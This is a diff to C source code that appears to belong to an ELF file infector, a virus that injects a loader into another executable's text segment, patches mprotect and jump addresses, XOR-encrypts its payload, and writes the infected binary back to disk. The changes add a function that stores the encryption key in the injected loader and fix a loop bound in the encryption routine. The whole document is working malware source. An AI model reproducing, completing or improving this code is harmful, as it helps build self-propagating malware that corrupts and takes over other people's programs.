@@ -20,9 +20,11 @@ static void	patch_loader(t_info *info)
 	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE - 4, &val, 4);
 
 	// rewrite addr for mprotect
+	start = info->text_addr + info->text_size + 0x69;
 	end = info->addr_payload;
 	val = end - start;
 	ft_memcpy(info->text_begin + info->text_size + 0x65, &val, 4); // 0x65 is pos of instruction targeted in loader
+
 }
 
 static void	inject_loader(t_info *info)
@@ -108,6 +110,7 @@ static void	patch_addresses(t_info *info)
 	end = (int32_t)(info->text_addr + info->text_size + LOADER_SIZE);
 	val = end - start;
 	ft_memcpy(info->file + info->offset_payload + OFFSET_3, &val, 4);
+
 }
 
 static int		reload_mapping(t_info *info)
@@ -148,7 +151,7 @@ uint32_t    encrypt(void *ptr, size_t size)
     while (nb < 8)
     {   
         i = 0;
-        while (i * 4 < size - 1)
+        while (i * 4 < size - 4)
         {   
             file[i] ^= key;
             key += file[i];
@@ -156,8 +159,16 @@ uint32_t    encrypt(void *ptr, size_t size)
         }   
         key -= SUB;
         nb++;
-    }   
+    }
     return (key);
+}
+
+void			patch_key(t_info *info, uint32_t key)
+{
+	uint32_t val;
+	// Key in loader
+	val = key;
+	ft_memcpy(info->text_begin + info->text_size + 0x7C, &val, 4); // 0x7D is pos of instruction targeted in loader
 }
 
 static void		infect_file(char *path)
@@ -191,7 +202,7 @@ static void		infect_file(char *path)
 		goto end_fct;
 	patch_addresses(&info);
 	inject_sign(&info);
-	encrypt(info.file + info.offset_payload, PAYLOAD_SIZE);
+	patch_key(&info, encrypt(info.file + info.offset_payload, PAYLOAD_SIZE));
 	ft_syswrite(fd, info.file, info.file_size);
 	end_fct:
 	ft_sysmunmap(info.file, info.file_size);
